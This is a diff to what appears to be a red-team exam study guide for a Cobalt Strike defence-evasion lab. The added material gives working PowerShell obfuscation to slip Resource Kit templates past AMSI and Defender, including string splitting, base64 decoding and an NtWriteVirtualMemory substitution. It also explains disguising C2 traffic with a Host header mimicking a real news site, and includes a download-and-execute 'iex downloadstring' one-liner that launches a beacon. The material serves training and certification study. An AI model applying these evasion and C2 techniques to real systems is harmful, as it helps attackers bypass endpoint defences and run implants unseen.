@@ -188,6 +188,8 @@ CS tries each execution method in listed order until one succeeds. The order mat
 | `NtQueueApcThread` | Standard APC | As above but standard (asynchronous). |
 | `SetThreadContext` | Hijacks thread via context modification | Last resort — most disruptive to the target thread. Only used if all others fail. |
 
+<img src="/images/defence-evasion-lab-01.png" width=1024>  
+
 ---
 
 ### Validate and restart the team server
@@ -246,6 +248,8 @@ while ( x-- ) {
     * ( ( char * ) buffer + x) = * ( ( char * ) buffer + x ) ^ key [ x % 8 ];
 }
 ```
+
+<img src="/images/defence-evasion-lab-04.png" width=1024>
 
 **Line ~116 — the normal .exe payload decryption loop:**
 
@@ -320,6 +324,8 @@ Cobalt Strike > Script Manager > Load
 
 All future payloads generated in CS now use the custom artifact stubs.
 
+<img src="/images/defence-evasion-lab-02.png" width=1024>
+
 ---
 
 ## Part 3 — Resource Kit
@@ -366,7 +372,33 @@ Open: template.x64.ps1
 
 **Why:** AMSI scans the literal script text for known strings. `'System.dll'` as a literal is
 on its pattern list. String concatenation is evaluated at runtime — AMSI sees `'Sys'+'tem.dll'`
-which doesn't match the pattern.
+which does not match the pattern.
+
+**Is `'Sys'+'tem.dll'` enough for the exam?**
+
+In the ZPS lab environment with the Defender version at time of lab build — yes, ThreatCheck
+confirmed it clean. However, AMSI signatures update. The only reliable answer is: **run
+ThreatCheck AMSI on exam day after building and confirm `No threat found`**. If it comes back
+detected, escalate the obfuscation using one of these alternatives:
+
+```powershell
+# Option 1 — variable substitution (breaks string-pattern matching entirely):
+$s = 'System'; .Equals($s + '.dll')
+
+# Option 2 — character array join:
+.Equals([string]::Join('', @('S','y','s','t','e','m','.','d','l','l')))
+
+# Option 3 — format string:
+.Equals('{0}.dll' -f 'System')
+
+# Option 4 — base64 decode at runtime (strongest, defeats all string matching):
+.Equals([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String('U3lzdGVtLmRsbA==')))
+# 'U3lzdGVtLmRsbA==' = base64('System.dll')
+```
+
+Apply whichever option ThreatCheck accepts. Always verify clean before loading `resources.cna`.
+
+<img src="/images/defence-evasion-lab-03.png" width=1024>
 
 **Line 32 — replace `Marshal.Copy` with `WriteProcessMemory`:**
 
@@ -381,6 +413,37 @@ usage pattern in the CS template context. The replacement achieves the same resu
 native Win32 `WriteProcessMemory` API directly via P/Invoke — different API call, no AMSI
 signature match. `[IntPtr]::New(-1)` is `-1` = current process handle (pseudo-handle), so this
 writes into the current process's own memory — identical effect to `Marshal.Copy` here.
+
+**Is `WriteProcessMemory` enough? The string itself is detectable.**
+
+The string literal `WriteProcessMemory` in the PS1 is visible to AMSI and could be flagged if
+Defender adds a signature for it. The lab version works against the current Skillable Defender
+build — but ThreatCheck is the only reliable way to confirm. If flagged, break the API name
+string the same way, since the `func_get_proc_address` helper resolves the API by string at
+runtime:
+
+```powershell
+# Option 1 — split the API name string (same as System.dll approach):
+$var_wpm = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer(
+    (func_get_proc_address kernel32.dll ('Write'+'ProcessMemory')),
+    (func_get_delegate_type @([IntPtr], [IntPtr], [Byte[]], [UInt32], [IntPtr]) ([Bool]))
+)
+$ok = $var_wpm.Invoke([IntPtr]::New(-1), $var_buffer, $v_code, $v_code.Count, [IntPtr]::Zero)
+
+# Option 2 — NtWriteVirtualMemory (lower-level ntdll API — less signatured than kernel32 equivalent):
+$var_ntwvm = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer(
+    (func_get_proc_address ntdll.dll ('NtWrite'+'VirtualMemory')),
+    (func_get_delegate_type @([IntPtr], [IntPtr], [Byte[]], [UInt32], [UInt32].MakeByRefType()) ([UInt32]))
+)
+$var_ntwvm.Invoke([IntPtr]::New(-1), $var_buffer, $v_code, $v_code.Count, [ref]0) | Out-Null
+```
+
+**Option 2** (NtWriteVirtualMemory) is the stronger alternative — it calls the syscall-adjacent ntdll
+function rather than the kernel32 wrapper, and is less commonly signatured. Both produce identical
+results in this context.
+
+**Priority:** Lab value first → ThreatCheck → if flagged, apply string split → ThreatCheck again
+→ if still flagged, switch to NtWriteVirtualMemory variant.
 
 Save the changes (File > Save).
 
@@ -399,6 +462,8 @@ The default version is a plain, readable PowerShell one-liner that AMSI has a pa
 This obfuscated version was generated via `Invoke-Obfuscation` (token-level obfuscation) and
 produces identical runtime behaviour — `%%DATA%%` is the shellcode placeholder CS fills at
 generation time.
+
+<img src="/images/defence-evasion-lab-05.png" width=1024>
 
 > **Critical:** Never rename or obfuscate `%%DATA%%`. CS does a literal string substitution to
 > inject the shellcode bytes. If `%%DATA%%` is missing, the payload generates with empty shellcode.
@@ -434,7 +499,107 @@ All PowerShell stagers CS generates will now use the modified templates.
 
 ## Part 4 — Testing
 
-### Generate a test beacon callback
+### Why `www.bleepincomputer.com` — Host Header Masquerading
+
+Before running the test, you need to understand what `www.bleepincomputer.com` is doing here
+and why it matters for OPSEC — this was set in the CS HTTP listener during the Cobalt Strike
+Primer lab:
+```
+HTTP Hosts:        www.bleepincomputer.com
+HTTP Host (Stager): www.bleepincomputer.com
+```
+
+**The core concept — HTTP Host header masquerading:**
+
+Every HTTP request contains a `Host:` header field. Beacon's C2 check-in requests are HTTP.
+The `HTTP Hosts` setting controls what value Beacon puts in the `Host:` header of its C2
+requests. This is separate from where the TCP connection actually goes.
+
+```
+Without masquerading:
+  Target → TCP connect → 10.0.0.5:80
+  HTTP request: GET /heartbeat HTTP/1.1
+                Host: 10.0.0.5          ← Raw team server IP in header
+                                         ← Network monitoring flags: host C2 on internal IP
+
+With masquerading (www.bleepincomputer.com):
+  Target → TCP connect → 10.0.0.5:80
+  HTTP request: GET /heartbeat HTTP/1.1
+                Host: www.bleepincomputer.com   ← Looks like browsing a legitimate security site
+                                                 ← Network monitoring/SIEM sees legitimate-looking traffic
+```
+
+**Why bleepincomputer.com specifically:**
+- BleepingComputer is a well-known, legitimate security news website
+- Network defenders expect to see employees browsing it
+- A proxy/IDS seeing `Host: www.bleepincomputer.com` HTTP traffic is unlikely to block it
+- A raw internal IP in the Host header is immediately suspicious
+
+**How the lab URL `http://www.bleepincomputer.com/a` resolves to the team server:**
+
+The ZPS lab environment has internal DNS configured (or hosts file entries) that resolve
+`www.bleepincomputer.com` to the team server IP `10.0.0.5`. This is a lab-only configuration.
+The TCP connection goes to 10.0.0.5 — only the Host header says bleepincomputer.com.
+
+**Exam day application:**
+
+The exam environment will have similar internal DNS pre-configured. When you set up your HTTP
+listener with a masquerading Host value, the DNS resolution routes to your team server. You
+do NOT need to configure DNS yourself — the lab/exam infrastructure handles it.
+
+If you use just the raw team server IP as the listener host instead, Beacon's outbound HTTP
+traffic will have `Host: 10.0.0.5` — an obvious C2 indicator. The masquerading domain is what
+makes your C2 traffic blend with legitimate web browsing.
+
+**OPSEC scoring relevance — exam criterion:**
+> "Outbound from unusual processes" — the HTTP requests from Beacon also need to have a
+> believable `Host:` header. Raw IP = OPSEC deduction. Legitimate domain = blends in.
+
+---
+
+### Exam Initial Access — What You Will Actually Do
+
+The exam is **assume-breach**. This means:
+- You are given credentials to log in to a foothold workstation
+- There is NO pre-running Beacon — you must spawn one yourself
+- Defender is ON — your Artifact Kit and Resource Kit must be clean before you do anything
+- The phishing delivery chain (ISO, LNK, AppDomainManager) from the Initial Access lab is
+  the full attack for delivering to a simulated victim — you do NOT need to build that chain
+  for your first exam beacon if you have direct workstation access
+
+**Fastest path to first beacon on exam day:**
+
+```
+1. Log in to the exam foothold workstation with provided credentials
+2. Open PowerShell
+3. Run Scripted Web Delivery payload (team server hosted it when you clicked Launch)
+```
+
+```powershell
+# Team server is already hosting the PS payload via Scripted Web Delivery
+# The URL contains your listener's host value (www.bleepincomputer.com or custom)
+iex (new-object net.webclient).downloadstring('http://www.bleepincomputer.com/<uri>')
+```
+
+**For this to work without Defender blocking:**
+- Resource Kit must be built and `resources.cna` loaded — AMSI will scan the PS1 as it downloads
+- Malleable C2 profile `stage` block must be active — beacon DLL survives memory scan post-inject
+- If Defender blocks the `iex downloadstring` step → Resource Kit issue (AMSI)
+- If Defender blocks after the script runs but before beacon checks in → Stage block issue (memory)
+
+**Alternative: run a pre-built payload exe directly:**
+
+If Scripted Web Delivery is blocked or unavailable, run a pre-built exe payload:
+```powershell
+# Payloads pre-built from lab are at C:\Payloads\ on the Windows dev box
+# Copy to target via available file share or CS web delivery, then execute:
+.\http_x64.exe
+```
+This only works if Artifact Kit is clean (exe payload survives static scan).
+
+---
+
+### Generate a test beacon callback (lab verification)
 
 ```
 CS GUI: Attacks > Scripted Web Delivery
@@ -446,6 +611,8 @@ On target (Workstation — PowerShell):
 ```powershell
 iex (new-object net.webclient).downloadstring("http://www.bleepincomputer.com/a")
 ```
+
+<img src="/images/defence-evasion-lab-06.png" width=1024>
 
 Switch back to Attacker Desktop — a new beacon should check in.
 
